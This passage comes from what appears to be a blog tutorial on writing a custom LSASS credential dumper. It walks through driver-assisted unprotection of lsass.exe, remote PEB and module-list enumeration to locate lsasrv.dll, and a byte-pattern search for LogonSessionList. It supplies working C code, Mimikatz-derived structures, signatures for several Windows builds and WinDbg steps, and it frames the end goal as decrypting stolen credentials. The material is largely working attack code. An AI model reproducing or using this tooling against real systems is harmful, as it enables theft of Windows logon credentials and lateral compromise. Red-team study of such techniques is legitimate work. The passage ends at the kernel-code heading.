	if (!pNtQueryInformationProcess) return false;

	PROCESS_BASIC_INFORMATION pProcBasicInfo = { 0 };
	ULONG ulRetLength = 0;

	NTSTATUS status = pNtQueryInformationProcess(hTarget, ProcessBasicInformation, &pProcBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &ulRetLength);

	if (!NT_SUCCESS(status)) {
		return false;
	}
	printf("pointing pPEB\n");

	*pPEB = pProcBasicInfo.PebBaseAddress;  // remote PEB address>????
	printf("pPEB pointed???????\n");
	return true;
}
```

Similar to when we found lsass we're pulling a function out of ntdll, `NtQueryInformationProcess`.

```c
NTSTATUS NtQueryInformationProcess(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);
```


When we specify `ProcessInformationClass` we're telling the function to retrieve basic information about the target process. This information is stored within the `PROCESS_BASIC_INFORMATION`

```c
typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;
```

Which contains a pointer to the PEB structure!

## Module Comparison

Now that we have the PEB address we can begin enumerating the modules loaded by the processes to find lsasrv.dll


First we start by specifying our `PEB_LDR_DATA` structure which contains our head `LIST_ENTRY` for the loaded modules.
```c
bool findLsasrv(HANDLE hTarget, PEB peb, PVOID* pTargetModuleBase, ULONG* pSize) {
	*pTargetModuleBase = NULL;
	printf("In NTLM\n");

	wprintf(L"SEARCHING FOR: %s\n", wTargetDLL);

	// 3) Read remote PEB_LDR_DATA
	PEB_LDR_DATA ldr = { 0 };
	printf("In NTLM\n");
	if (!ReadProcessMemory(hTarget, peb.Ldr, &ldr, sizeof(ldr), NULL)) {
		printf("LDR\n");
		return FALSE;
	}
	printf("retrieved remote head entry addr\n");
```

Within the `PEB_LDR_DATA` structure we can loop through `InLoadOrderModuleList` or the `InMemoryOrderModuleList` list to see all the modules.  They in theory should contain the same module pointers, just arranged based on when they were loaded into the process or based on how they're arranged in memory, but wholistically contain the same information.


```c 
	// 4) Compute remote address of list head (InMemoryOrderModuleList)
	//    and read the head LIST_ENTRY
	const BYTE* remoteLdrBase = (const BYTE*)peb.Ldr;
	const BYTE* remoteHeadAddr = remoteLdrBase + offsetof(PEB_LDR_DATA, InMemoryOrderModuleList);
```

Now with a pointer to the head list entry address inside of LSASS we can read that to extract the `LIST_ENTRY` structure.

```c
	LIST_ENTRY headLE = { 0 };
	if (!ReadProcessMemory(hTarget, remoteHeadAddr, &headLE, sizeof(headLE), NULL)) {
		printf("headLE\n");
		return false;
	}
	printf("retrieved remote head entry addr\n");
```


From here we keep this the same as our comparison to make sure we dont constantly loop through the modules, and can start Flinking through the loaded DLLs.
```c
	// 5) Iterate: remoteCurrent points to a remote LIST_ENTRY
	const LIST_ENTRY* remoteCurrentAddr = headLE.Flink;
	printf("Out of while loops\n");
	while (remoteCurrentAddr != (const LIST_ENTRY*)remoteHeadAddr) {
		// Read the current remote LIST_ENTRY
		LIST_ENTRY curLE = { 0 };
		if (!ReadProcessMemory(hTarget, remoteCurrentAddr, &curLE, sizeof(curLE), NULL))
			break;
		// Compute the remote address of the containing LDR_DATA_TABLE_ENTRY:
		//   entryAddr = remoteCurrentAddr - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)
		const BYTE* remoteEntryAddr =
			(const BYTE*)remoteCurrentAddr - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		// Read only the fields we need from the entry to keep it robust
		struct {
			LIST_ENTRY InLoadOrderLinks;
			LIST_ENTRY InMemoryOrderLinks;
			LIST_ENTRY InInitializationOrderLinks;
			PVOID      DllBase;
			PVOID      EntryPoint;
			ULONG      SizeOfImage;
			UNICODE_STRING FullDllName;
			UNICODE_STRING BaseDllName;
		} entry;

		if (!ReadProcessMemory(hTarget, remoteEntryAddr, &entry, sizeof(entry), NULL))
			break;

		// Read the UNICODE_STRING buffer (full path)
		wchar_t fullPath[MAX_PATH * 4]; // large enough for winSxS paths
		if (!ReadUnicodeStringRemote(hTarget, &entry.FullDllName, fullPath, _countof(fullPath)))
			fullPath[0] = L'\0';

		// Debug print
		wprintf(L"Reading %s\n", fullPath);

		// Compare
		if (_wcsicmp(fullPath, wTargetDLL) == 0) {
			*pTargetModuleBase = entry.DllBase;
			*pSize = entry.SizeOfImage;
			printf("MODULE FOUND!!!\n");
			return TRUE;
		}
		// Advance: move to next wnode using the pointer we just read into curLE
		remoteCurrentAddr = curLE.Flink;
	}

	return FALSE;
}
```

Within each LIST_ENTRY we're pulling the `LDR_DATA_TABLE_ENTRY` which contains an element for the FullDllName that we use to confirm when we've found L"C:\\Windows\\system32\\lsasrv.dll"`.

# Extracting Credentials

Now that we've found lsasrv.dll comes the fun part, extracting credentials! Lets take another look at our checklist:

1. Create driver ✔️
2. Load driver ✔️
3. Unprotect lsass ✔️
4. Get lsass process handle ✔️
5. Find lsasrv.dll in lsass memory space ✔️
6. Find `LogonSessionList` pattern match address in lsasrv.dll
7. Find AES/DES/IV Key pattern match address in lsasrv.dll
8. Read through LogonSessionList for encrypted security blobs
9. Extract AES / DES / IV Keys
10. Decrypt encrypted security blob
11. MONEY!

## LogonSessionList

The LogonSessionList is a structure unique to lsass that stores the credentials we're after.  This is where some review of the Mimikatz source code starts to come in handy.  The LogonSessionList is represented in Mimikatz as the `PKIWI_MSV1_0_LIST_63` structure:

```c
typedef struct _LSA_UNICODE_STRING {
    USHORT Length;          // in bytes, not characters
    USHORT MaximumLength;   // in bytes
    PWSTR  Buffer;          // pointer to wide string
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING;

typedef struct _KIWI_MSV1_0_LIST_63 {
    struct _KIWI_MSV1_0_LIST_63* Flink;
    struct _KIWI_MSV1_0_LIST_63* Blink;
    PVOID unk0;
    ULONG unk1;
    PVOID unk2;
    ULONG unk3;
    ULONG unk4;
    ULONG unk5;
    HANDLE hSemaphore6;
    PVOID unk7;
    HANDLE hSemaphore8;
    PVOID unk9;
    PVOID unk10;
    ULONG unk11;
    ULONG unk12;
    PVOID unk13;
    LUID LocallyUniqueIdentifier;
    LUID SecondaryLocallyUniqueIdentifier;
    UCHAR waza[12];
    LSA_UNICODE_STRING UserName;
    LSA_UNICODE_STRING Domaine;
    PVOID unk14;
    PVOID unk15;
    LSA_UNICODE_STRING Type;
    PSID pSid;
    ULONG LogonType;
    PVOID unk18;
    ULONG Session;
    LARGE_INTEGER LogonTime;
    LSA_UNICODE_STRING LogonServer;
    KIWI_MSV1_0_CREDENTIALS* Credentials;
    PVOID unk19;
    PVOID unk20;
    PVOID unk21;
    ULONG unk22;
    ULONG unk23;
    ULONG unk24;
    ULONG unk25;
    ULONG unk26;
    PVOID unk27;
    PVOID unk28;
    PVOID unk29;
    PVOID CredentialManager;
} KIWI_MSV1_0_LIST_63, * PKIWI_MSV1_0_LIST_63;
```

Here you can see a lot of unique and useful fields like `Username`'s, `Domain`'s, but what we're really after the `Credentials`.  We'll talk more about this list later, but for now we're just going to focus on finding it.

## Finding the LogonSessionList

Once again taking inspiration from Mimikatz is something I encourage!

You may want to save this link: [mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c at master · gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c)


![[Pasted image 20250902212303.png]]

Here we see mimikatz defining a pattern to search within the lsasrv memory space, with slight variations in the matter depending on which build of Windows the victim machine is running.  Once mimikatz has the address of where this pattern matches, its possible to retrieve the `LogonSessionList`pointer.

We can perform this sequence in Windgb first to get a better understanding of what we're actually doing.

First we need to attach to the lsass prospect, and find where lsasrv.dll's base address is:

```bash
!process 0 0 lsass.exe  # dump EPROCESS info briefly for lsass.exe>
```

![[Pasted image 20250902212823.png]]

Now we use the EPROCESS pointer and supply it to the `.process` command which changes the context of Windgb to that of the process.  Essentially it tells the debugger to pretend as if it's inside of your target process, thus allowing you to better interact with the memory addresses for that process.

```bash
.process /i /r /p ffffa886a73e7080 # Change context to process @ EPROCESS addr 
g
```

![[Pasted image 20250902213151.png]]

After changing the context of your debugger, in my experience you do need to reload your symbols.

```
.reload /user
```
![[Pasted image 20250902213502.png]]

Now we should be able to search for the lsasrv module with the `lm` command which [lists modules]([lm (List Loaded Modules) - Windows drivers | Microsoft Learn](https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/lm--list-loaded-modules-)) that are loaded in memory by a process.  We specify a specific module with the `m` flag.

```
lm m lsasrv
```
![[Pasted image 20250902213640.png]]

Here we see the memory address range for the module!  Now we know exactly where our search will begin and where it will stop.


```c
BYTE PTRN_WIN5_LogonSessionList[]	= {0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8};
BYTE PTRN_WN60_LogonSessionList[]	= {0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84};
BYTE PTRN_WN61_LogonSessionList[]	= {0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84};
BYTE PTRN_WN63_LogonSessionList[]	= {0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05};
BYTE PTRN_WN6x_LogonSessionList[]	= {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
BYTE PTRN_WN1703_LogonSessionList[]	= {0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
BYTE PTRN_WN1803_LogonSessionList[] = {0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74};
BYTE PTRN_WN11_LogonSessionList[]	= {0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74};
BYTE PTRN_WN11_22H2_LogonSessionList[]	= {0x45, 0x89, 0x37, 0x4c, 0x8b, 0xf7, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x0f, 0x84};

--

4c 8b df 49 c1 e3 04 48 8b cb 4c 03 d8
33 ff 45 85 c0 41 89 75 00 4c 8b e3 0f 84
33 f6 45 89 2f 4c 8b f3 85 ff 0f 84 
8b de 48 8d 0c 5b 48 c1 e1 05 48 8d 05
33 ff 41 89 37 4c 8b f3 45 85 c0 74 <- first one w a hit on my machine!
33 ff 45 89 37 48 8b f3 45 85 c9 74
33 ff 41 89 37 4c 8b f3 45 85 c9 74 
45 89 34 24 4c 8b ff 8b f3 45 85 c0 74
45 89 37 4c 8b f7 8b f3 45 85 c0 0f 84
```

To search for any of the byte sequences above we use the `s` [command]([s (Search Memory) - Windows drivers | Microsoft Learn](https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/s--search-memory-)) which searches for a byte sequence in memory.

```
s -b 00007ffd`bd8d0000 00007ffd`bda7e000 33 ff 41 89 37 4c 8b f3 45 85 c0 74
```
![[Pasted image 20250902214041.png]]

And we get a hit!  Lets [unassemble]([u, ub, uu (Unassemble) - Windows drivers | Microsoft Learn](https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/u--unassemble-)) this bit of memory and see what kind of instructions are taking place there.  This provides an assembly translation at an address of our choosing.

```
u 00007ffd`bd93e384
```

![[Pasted image 20250902214235.png]]

Perfect! We actually SEE the reference to LogonSessionList. Here the assembler is telling the computer to place the address of LogonSessionList inside of the rcx register.

We are `lea`'ing the LogonSessionList address into RCX.  We're loading the effective address of LogonSessionList into rcx, so it MUST be passing the pointer to the struct we need, which obviously it is and we can see that in the image above.

Its also just a rule that `rcx` is equal to the address of the next instruction + the displacement from the address of the next instruction TO the LogonSessionList

```c
00007ffd`bd93e384 = pattern match
Each instruction sequence is 7 bytes.
We have an offset of 20 to get to the lea instruction.
...
...
00007ffd`bd93e398 488d0d<915b1200> lea  rcx,[lsasrv!LogonSessionList (00007ffd`bda63f30)]    +0x20
Then our next address is 00007ffd`bd93e398 + 0x07 = 
00007ffd`bd93e39f + offset of <00125b91> (Little endian of 915b1200) = LogonSessoinList
```


![[Pasted image 20250902220710.png]]

Hopefully that makes sense because now we need to implement this process in C!

## Pattern Searching

### Userland Code

As a POC for reading memory in userspace from the kernel, I ended up doing this process through the driver and IOCTL calls.

```c
struct Patterns {
	PVOID pLogonSessionListPattern;
	PVOID pKeysPattern;
};
...
driver::Patterns bytePatterns = { 0 };
bytePatterns = driver::findLogonSessionList(hDriver, pLsasrv, pEnd);
```

We create a structure to hold two patterns since I both of my pattern searches at the same time, we'll come back to the keys pattern later, but then I end up calling the `findLogonSessionList` function.

This part is actually fairly straight forward:

```c
	Patterns findLogonSessionList(HANDLE hDriver, PVOID pBase, PVOID pEnd) {
		Request req;
		req.pBase = pBase;
		req.pEnd = pEnd;

		printf("Base: 0x%p\n", req.pBase);
		printf("End : 0x%p\n", req.pEnd);

		req.Patterns = { 0 };
		DeviceIoControl(hDriver, codes::lssl, &req, sizeof(req), &req, sizeof(req), nullptr, nullptr);
		if (req.Patterns.pKeysPattern == NULL || req.Patterns.pLogonSessionListPattern == NULL) {
			printf("DeviceIoControl error getting pLssl,,.,.\n");
		}
		printf("Pattern LogonSessionList @ 0x%p\nPattern Keys @ 0x%p\n", req.Patterns.pLogonSessionListPattern, req.Patterns.pKeysPattern);
		return req.Patterns;
	}
```

We're retruning that `Patterns` struct displayed just above,  The base and and end address come from our module enumeration earlier, and the patterns we're searching for are stored in the driver.

On this side of the kernel, all we do is send an IOCTL to our driver and wait for pointers back.

### Kernelland Code

